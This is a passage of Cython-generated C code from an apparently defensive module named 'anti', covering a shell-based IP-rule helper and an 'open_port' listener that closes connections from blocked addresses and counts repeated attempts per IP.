        __pyx_t_7 = NULL;
        __pyx_t_9 = 0;
        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_5))) {
            __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_5);
            if (likely(__pyx_t_7)) {
                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_5);
                __Pyx_INCREF(__pyx_t_7);
                __Pyx_INCREF(function);
                __Pyx_DECREF_SET(__pyx_t_5, function);
                __pyx_t_9 = 1;
            }
        }
#if CYTHON_FAST_PYCALL
        if (PyFunction_Check(__pyx_t_5)) {
            PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_t_6, __pyx_t_8 };
            __pyx_t_4 = __Pyx_PyFunction_FastCall(__pyx_t_5, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_GOTREF(__pyx_t_4);
            __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
            __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
        }
        else
#endif
#if CYTHON_FAST_PYCCALL
            if (__Pyx_PyFastCFunction_Check(__pyx_t_5)) {
                PyObject* __pyx_temp[3] = { __pyx_t_7, __pyx_t_6, __pyx_t_8 };
                __pyx_t_4 = __Pyx_PyCFunction_FastCall(__pyx_t_5, __pyx_temp + 1 - __pyx_t_9, 2 + __pyx_t_9); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
                __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_6); __pyx_t_6 = 0;
                __Pyx_DECREF(__pyx_t_8); __pyx_t_8 = 0;
            }
            else
#endif
            {
                __pyx_t_10 = PyTuple_New(2 + __pyx_t_9); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 102, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_10);
                if (__pyx_t_7) {
                    __Pyx_GIVEREF(__pyx_t_7); PyTuple_SET_ITEM(__pyx_t_10, 0, __pyx_t_7); __pyx_t_7 = NULL;
                }
                __Pyx_GIVEREF(__pyx_t_6);
                PyTuple_SET_ITEM(__pyx_t_10, 0 + __pyx_t_9, __pyx_t_6);
                __Pyx_GIVEREF(__pyx_t_8);
                PyTuple_SET_ITEM(__pyx_t_10, 1 + __pyx_t_9, __pyx_t_8);
                __pyx_t_6 = 0;
                __pyx_t_8 = 0;
                __pyx_t_4 = __Pyx_PyObject_Call(__pyx_t_5, __pyx_t_10, NULL); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
                    __Pyx_GOTREF(__pyx_t_4);
                __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
            }
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __pyx_t_5 = PyTuple_New(1); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_5);
        __Pyx_GIVEREF(__pyx_t_4);
        PyTuple_SET_ITEM(__pyx_t_5, 0, __pyx_t_4);
        __pyx_t_4 = 0;
        __pyx_t_4 = __Pyx_PyDict_NewPresized(3); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_4);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_shell, Py_True) < 0) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_PIPE); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_10);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_stdin, __pyx_t_10) < 0) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __Pyx_GetModuleGlobalName(__pyx_t_10, __pyx_n_s_DEVNULL); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_10);
        if (PyDict_SetItem(__pyx_t_4, __pyx_n_s_stdout, __pyx_t_10) < 0) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_DECREF(__pyx_t_10); __pyx_t_10 = 0;
        __pyx_t_10 = __Pyx_PyObject_Call(__pyx_t_1, __pyx_t_5, __pyx_t_4); if (unlikely(!__pyx_t_10)) __PYX_ERR(0, 102, __pyx_L1_error)
            __Pyx_GOTREF(__pyx_t_10);
        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __pyx_v__ = __pyx_t_10;
        __pyx_t_10 = 0;
    }
    __pyx_r = Py_None; __Pyx_INCREF(Py_None);
    goto __pyx_L0;
__pyx_L1_error:;
    __Pyx_XDECREF(__pyx_t_1);
    __Pyx_XDECREF(__pyx_t_4);
    __Pyx_XDECREF(__pyx_t_5);
    __Pyx_XDECREF(__pyx_t_6);
    __Pyx_XDECREF(__pyx_t_7);
    __Pyx_XDECREF(__pyx_t_8);
    __Pyx_XDECREF(__pyx_t_10);
    __Pyx_AddTraceback("anti.add_ip_rule", __pyx_clineno, __pyx_lineno, __pyx_filename);
    __pyx_r = NULL;
__pyx_L0:;
    __Pyx_XDECREF(__pyx_v__);
    __Pyx_XGIVEREF(__pyx_r);
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}
static PyObject* __pyx_pw_4anti_17open_port(PyObject* __pyx_self, PyObject* __pyx_v_port);
static PyMethodDef __pyx_mdef_4anti_17open_port = { "open_port", (PyCFunction)__pyx_pw_4anti_17open_port, METH_O, 0 };
static PyObject* __pyx_pw_4anti_17open_port(PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_r = 0;
    __Pyx_RefNannyDeclarations
        __Pyx_RefNannySetupContext("open_port (wrapper)", 0);
    __pyx_r = __pyx_pf_4anti_16open_port(__pyx_self, ((PyObject*)__pyx_v_port));
    __Pyx_RefNannyFinishContext();
    return __pyx_r;
}

static PyObject* __pyx_pf_4anti_16open_port(CYTHON_UNUSED PyObject* __pyx_self, PyObject* __pyx_v_port) {
    PyObject* __pyx_v_count = NULL;
    PyObject* __pyx_v_soc = NULL;
    PyObject* __pyx_v_a = NULL;
    PyObject* __pyx_v_b = NULL;
    PyObject* __pyx_v_con_ip = NULL;
    PyObject* __pyx_v_server_socket = NULL;
    PyObject* __pyx_v_e = NULL;
    PyObject* __pyx_r = NULL;
    __Pyx_RefNannyDeclarations
        PyObject* __pyx_t_1 = NULL;
    PyObject* __pyx_t_2 = NULL;
    PyObject* __pyx_t_3 = NULL;
    PyObject* __pyx_t_4 = NULL;
    PyObject* __pyx_t_5 = NULL;
    int __pyx_t_6;
    PyObject* __pyx_t_7 = NULL;
    PyObject* __pyx_t_8 = NULL;
    PyObject* __pyx_t_9 = NULL;
    PyObject* __pyx_t_10 = NULL;
    PyObject* __pyx_t_11 = NULL;
    PyObject* __pyx_t_12 = NULL;
    PyObject* __pyx_t_13 = NULL;
    PyObject* (*__pyx_t_14)(PyObject*);
    int __pyx_t_15;
    int __pyx_t_16;
    PyObject* __pyx_t_17 = NULL;
    PyObject* __pyx_t_18 = NULL;
    PyObject* __pyx_t_19 = NULL;
    Py_ssize_t __pyx_t_20;
    Py_UCS4 __pyx_t_21;
    int __pyx_t_22;
    int __pyx_t_23;
    char const* __pyx_t_24;
    PyObject* __pyx_t_25 = NULL;
    PyObject* __pyx_t_26 = NULL;
    PyObject* __pyx_t_27 = NULL;
    char const* __pyx_t_28;
    int __pyx_lineno = 0;
    const char* __pyx_filename = NULL;
    int __pyx_clineno = 0;
    __Pyx_RefNannySetupContext("open_port", 0);
    __Pyx_INCREF(__pyx_int_0);
    __pyx_v_count = __pyx_int_0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_socket); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_socket); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_3);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_socket); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_4 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_AF_INET); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_4);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __Pyx_GetModuleGlobalName(__pyx_t_2, __pyx_n_s_socket); if (unlikely(!__pyx_t_2)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_2);
    __pyx_t_5 = __Pyx_PyObject_GetAttrStr(__pyx_t_2, __pyx_n_s_SOCK_STREAM); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 106, __pyx_L1_error)
        __Pyx_GOTREF(__pyx_t_5);
    __Pyx_DECREF(__pyx_t_2); __pyx_t_2 = 0;
    __pyx_t_2 = NULL;
    __pyx_t_6 = 0;
    if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
        __pyx_t_2 = PyMethod_GET_SELF(__pyx_t_3);
        if (likely(__pyx_t_2)) {
            PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
            __Pyx_INCREF(__pyx_t_2);
            __Pyx_INCREF(function);
            __Pyx_DECREF_SET(__pyx_t_3, function);
            __pyx_t_6 = 1;
        }
    }
#if CYTHON_FAST_PYCALL
    if (PyFunction_Check(__pyx_t_3)) {
        PyObject* __pyx_temp[3] = { __pyx_t_2, __pyx_t_4, __pyx_t_5 };
        __pyx_t_1 = __Pyx_PyFunction_FastCall(__pyx_t_3, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
            __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
        __Pyx_GOTREF(__pyx_t_1);
        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
        __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
    }
    else
#endif
#if CYTHON_FAST_PYCCALL
        if (__Pyx_PyFastCFunction_Check(__pyx_t_3)) {
            PyObject* __pyx_temp[3] = { __pyx_t_2, __pyx_t_4, __pyx_t_5 };
            __pyx_t_1 = __Pyx_PyCFunction_FastCall(__pyx_t_3, __pyx_temp + 1 - __pyx_t_6, 2 + __pyx_t_6); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
                __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
            __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            __Pyx_DECREF(__pyx_t_5); __pyx_t_5 = 0;
        }
        else
#endif
        {
            __pyx_t_7 = PyTuple_New(2 + __pyx_t_6); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 106, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_7);
            if (__pyx_t_2) {
                __Pyx_GIVEREF(__pyx_t_2); PyTuple_SET_ITEM(__pyx_t_7, 0, __pyx_t_2); __pyx_t_2 = NULL;
            }
            __Pyx_GIVEREF(__pyx_t_4);
            PyTuple_SET_ITEM(__pyx_t_7, 0 + __pyx_t_6, __pyx_t_4);
            __Pyx_GIVEREF(__pyx_t_5);
            PyTuple_SET_ITEM(__pyx_t_7, 1 + __pyx_t_6, __pyx_t_5);
            __pyx_t_4 = 0;
            __pyx_t_5 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_t_3, __pyx_t_7, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 106, __pyx_L1_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
        }
    __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
    __pyx_v_soc = __pyx_t_1;
    __pyx_t_1 = 0;
    {
        __Pyx_PyThreadState_declare
            __Pyx_PyThreadState_assign
            __Pyx_ExceptionSave(&__pyx_t_8, &__pyx_t_9, &__pyx_t_10);
        __Pyx_XGOTREF(__pyx_t_8);
        __Pyx_XGOTREF(__pyx_t_9);
        __Pyx_XGOTREF(__pyx_t_10); {
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_soc, __pyx_n_s_bind); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_3);
            __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_host_fake); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_5 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_7); if (unlikely(!__pyx_t_5)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_5);
            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
            __pyx_t_7 = __Pyx_PyNumber_Int(__pyx_v_port); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_7);
            __pyx_t_4 = PyTuple_New(2); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_4);
            __Pyx_GIVEREF(__pyx_t_5);
            PyTuple_SET_ITEM(__pyx_t_4, 0, __pyx_t_5);
            __Pyx_GIVEREF(__pyx_t_7);
            PyTuple_SET_ITEM(__pyx_t_4, 1, __pyx_t_7);
            __pyx_t_5 = 0;
            __pyx_t_7 = 0;
            __pyx_t_7 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_7 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_7)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                    __Pyx_INCREF(__pyx_t_7);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_3, function);
                }
            }
            __pyx_t_1 = (__pyx_t_7) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_7, __pyx_t_4) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4);
            __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0;
            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 108, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_soc, __pyx_n_s_listen); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 109, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_4)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                    __Pyx_INCREF(__pyx_t_4);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_3, function);
                }
            }
            __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_int_9) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_int_9);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 109, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_create_rule); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 110, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_3);
            __pyx_t_4 = NULL;
            if (CYTHON_UNPACK_METHODS && unlikely(PyMethod_Check(__pyx_t_3))) {
                __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
                if (likely(__pyx_t_4)) {
                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                    __Pyx_INCREF(__pyx_t_4);
                    __Pyx_INCREF(function);
                    __Pyx_DECREF_SET(__pyx_t_3, function);
                }
            }
            __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_Call2Args(__pyx_t_3, __pyx_t_4, __pyx_v_port) : __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_v_port);
            __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
            if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 110, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            __pyx_t_1 = __Pyx_PyObject_Call(__pyx_builtin_print, __pyx_tuple__18, NULL); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 111, __pyx_L3_error)
                __Pyx_GOTREF(__pyx_t_1);
            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
            while (1) {
                {
                    __Pyx_PyThreadState_declare
                        __Pyx_PyThreadState_assign
                        __Pyx_ExceptionSave(&__pyx_t_11, &__pyx_t_12, &__pyx_t_13);
                    __Pyx_XGOTREF(__pyx_t_11);
                    __Pyx_XGOTREF(__pyx_t_12);
                    __Pyx_XGOTREF(__pyx_t_13); {
                        __pyx_t_3 = __Pyx_PyObject_GetAttrStr(__pyx_v_soc, __pyx_n_s_accept); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 114, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_3);
                        __pyx_t_4 = NULL;
                        if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_3))) {
                            __pyx_t_4 = PyMethod_GET_SELF(__pyx_t_3);
                            if (likely(__pyx_t_4)) {
                                PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_3);
                                __Pyx_INCREF(__pyx_t_4);
                                __Pyx_INCREF(function);
                                __Pyx_DECREF_SET(__pyx_t_3, function);
                            }
                        }
                        __pyx_t_1 = (__pyx_t_4) ? __Pyx_PyObject_CallOneArg(__pyx_t_3, __pyx_t_4) : __Pyx_PyObject_CallNoArg(__pyx_t_3);
                        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                        if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 114, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                        if ((likely(PyTuple_CheckExact(__pyx_t_1))) || (PyList_CheckExact(__pyx_t_1))) {
                            PyObject* sequence = __pyx_t_1;
                            Py_ssize_t size = __Pyx_PySequence_SIZE(sequence);
                            if (unlikely(size != 2)) {
                                if (size > 2) __Pyx_RaiseTooManyValuesError(2);
                                else if (size >= 0) __Pyx_RaiseNeedMoreValuesError(size);
                                __PYX_ERR(0, 114, __pyx_L11_error)
                            }
#if CYTHON_ASSUME_SAFE_MACROS && !CYTHON_AVOID_BORROWED_REFS
                            if (likely(PyTuple_CheckExact(sequence))) {
                                __pyx_t_3 = PyTuple_GET_ITEM(sequence, 0);
                                __pyx_t_4 = PyTuple_GET_ITEM(sequence, 1);
                            }
                            else {
                                __pyx_t_3 = PyList_GET_ITEM(sequence, 0);
                                __pyx_t_4 = PyList_GET_ITEM(sequence, 1);
                            }
                            __Pyx_INCREF(__pyx_t_3);
                            __Pyx_INCREF(__pyx_t_4);
#else
                            __pyx_t_3 = PySequence_ITEM(sequence, 0); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 114, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_3);
                            __pyx_t_4 = PySequence_ITEM(sequence, 1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 114, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
#endif
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        }
                        else {
                            Py_ssize_t index = -1;
                            __pyx_t_7 = PyObject_GetIter(__pyx_t_1); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 114, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_7);
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            __pyx_t_14 = Py_TYPE(__pyx_t_7)->tp_iternext;
                            index = 0; __pyx_t_3 = __pyx_t_14(__pyx_t_7); if (unlikely(!__pyx_t_3)) goto __pyx_L19_unpacking_failed;
                            __Pyx_GOTREF(__pyx_t_3);
                            index = 1; __pyx_t_4 = __pyx_t_14(__pyx_t_7); if (unlikely(!__pyx_t_4)) goto __pyx_L19_unpacking_failed;
                            __Pyx_GOTREF(__pyx_t_4);
                            if (__Pyx_IternextUnpackEndCheck(__pyx_t_14(__pyx_t_7), 2) < 0) __PYX_ERR(0, 114, __pyx_L11_error)
                                __pyx_t_14 = NULL;
                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                            goto __pyx_L20_unpacking_done;
                        __pyx_L19_unpacking_failed:;
                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                            __pyx_t_14 = NULL;
                            if (__Pyx_IterFinish() == 0) __Pyx_RaiseNeedMoreValuesError(index);
                            __PYX_ERR(0, 114, __pyx_L11_error)
                                __pyx_L20_unpacking_done:;
                        }
                        __Pyx_XDECREF_SET(__pyx_v_a, __pyx_t_3);
                        __pyx_t_3 = 0;
                        __Pyx_XDECREF_SET(__pyx_v_b, __pyx_t_4);
                        __pyx_t_4 = 0;
                        __pyx_t_1 = __Pyx_GetItemInt(__pyx_v_b, 0, long, 1, __Pyx_PyInt_From_long, 0, 0, 1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 115, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_1);
                        __pyx_t_4 = __Pyx_PyObject_CallOneArg(((PyObject*)(&PyUnicode_Type)), __pyx_t_1); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 115, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                        __Pyx_XDECREF_SET(__pyx_v_con_ip, __pyx_t_4);
                        __pyx_t_4 = 0;
                        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_block); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 116, __pyx_L11_error)
                            __Pyx_GOTREF(__pyx_t_4);
                        __pyx_t_15 = (__Pyx_PySequence_ContainsTF(__pyx_v_con_ip, __pyx_t_4, Py_EQ)); if (unlikely(__pyx_t_15 < 0)) __PYX_ERR(0, 116, __pyx_L11_error)
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                        __pyx_t_16 = (__pyx_t_15 != 0);
                        if (__pyx_t_16) {
                            __pyx_t_1 = __Pyx_PyObject_GetAttrStr(__pyx_v_a, __pyx_n_s_close); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 117, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_1);
                            __pyx_t_3 = NULL;
                            if (CYTHON_UNPACK_METHODS && likely(PyMethod_Check(__pyx_t_1))) {
                                __pyx_t_3 = PyMethod_GET_SELF(__pyx_t_1);
                                if (likely(__pyx_t_3)) {
                                    PyObject* function = PyMethod_GET_FUNCTION(__pyx_t_1);
                                    __Pyx_INCREF(__pyx_t_3);
                                    __Pyx_INCREF(function);
                                    __Pyx_DECREF_SET(__pyx_t_1, function);
                                }
                            }
                            __pyx_t_4 = (__pyx_t_3) ? __Pyx_PyObject_CallOneArg(__pyx_t_1, __pyx_t_3) : __Pyx_PyObject_CallNoArg(__pyx_t_1);
                            __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                            if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 117, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_force_firewall_count); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 118, __pyx_L11_error)
                                __Pyx_GOTREF(__pyx_t_4);
                            __pyx_t_1 = PyObject_RichCompare(__pyx_t_4, __pyx_int_0, Py_GT); __Pyx_XGOTREF(__pyx_t_1); if (unlikely(!__pyx_t_1)) __PYX_ERR(0, 118, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                            __pyx_t_16 = __Pyx_PyObject_IsTrue(__pyx_t_1); if (unlikely(__pyx_t_16 < 0)) __PYX_ERR(0, 118, __pyx_L11_error)
                                __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                            if (__pyx_t_16) {
                                {
                                    __Pyx_PyThreadState_declare
                                        __Pyx_PyThreadState_assign
                                        __Pyx_ExceptionSave(&__pyx_t_17, &__pyx_t_18, &__pyx_t_19);
                                    __Pyx_XGOTREF(__pyx_t_17);
                                    __Pyx_XGOTREF(__pyx_t_18);
                                    __Pyx_XGOTREF(__pyx_t_19); {
                                        __Pyx_INCREF(__pyx_v_con_ip);
                                        __pyx_t_1 = __pyx_v_con_ip;
                                        __Pyx_GetModuleGlobalName(__pyx_t_4, __pyx_n_s_force_block); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L23_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __pyx_t_3 = __Pyx_PyObject_GetItem(__pyx_t_4, __pyx_t_1); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 120, __pyx_L23_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __pyx_t_4 = __Pyx_PyInt_AddObjC(__pyx_t_3, __pyx_int_1, 1, 1, 0); if (unlikely(!__pyx_t_4)) __PYX_ERR(0, 120, __pyx_L23_error)
                                            __Pyx_GOTREF(__pyx_t_4);
                                        __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        __Pyx_GetModuleGlobalName(__pyx_t_3, __pyx_n_s_force_block); if (unlikely(!__pyx_t_3)) __PYX_ERR(0, 120, __pyx_L23_error)
                                            __Pyx_GOTREF(__pyx_t_3);
                                        if (unlikely(PyObject_SetItem(__pyx_t_3, __pyx_t_1, __pyx_t_4) < 0)) __PYX_ERR(0, 120, __pyx_L23_error)
                                            __Pyx_DECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        __Pyx_DECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __Pyx_DECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    }
                                    __Pyx_XDECREF(__pyx_t_17); __pyx_t_17 = 0;
                                    __Pyx_XDECREF(__pyx_t_18); __pyx_t_18 = 0;
                                    __Pyx_XDECREF(__pyx_t_19); __pyx_t_19 = 0;
                                    goto __pyx_L30_try_end;
                                __pyx_L23_error:;
                                    __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                    __Pyx_XDECREF(__pyx_t_2); __pyx_t_2 = 0;
                                    __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                    __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                    __Pyx_XDECREF(__pyx_t_5); __pyx_t_5 = 0;
                                    __Pyx_XDECREF(__pyx_t_7); __pyx_t_7 = 0; {
                                        __Pyx_AddTraceback("anti.open_port", __pyx_clineno, __pyx_lineno, __pyx_filename);
                                        if (__Pyx_GetException(&__pyx_t_1, &__pyx_t_4, &__pyx_t_3) < 0) __PYX_ERR(0, 121, __pyx_L25_except_error)
                                            __Pyx_GOTREF(__pyx_t_1);
                                        __Pyx_GOTREF(__pyx_t_4);
                                        __Pyx_GOTREF(__pyx_t_3);
                                        __Pyx_GetModuleGlobalName(__pyx_t_7, __pyx_n_s_force_block); if (unlikely(!__pyx_t_7)) __PYX_ERR(0, 122, __pyx_L25_except_error)
                                            __Pyx_GOTREF(__pyx_t_7);
                                        if (unlikely(PyObject_SetItem(__pyx_t_7, __pyx_v_con_ip, __pyx_int_1) < 0)) __PYX_ERR(0, 122, __pyx_L25_except_error)
                                            __Pyx_DECREF(__pyx_t_7); __pyx_t_7 = 0;
                                        __Pyx_XDECREF(__pyx_t_1); __pyx_t_1 = 0;
                                        __Pyx_XDECREF(__pyx_t_4); __pyx_t_4 = 0;
                                        __Pyx_XDECREF(__pyx_t_3); __pyx_t_3 = 0;
                                        goto __pyx_L24_exception_handled;
                                    }
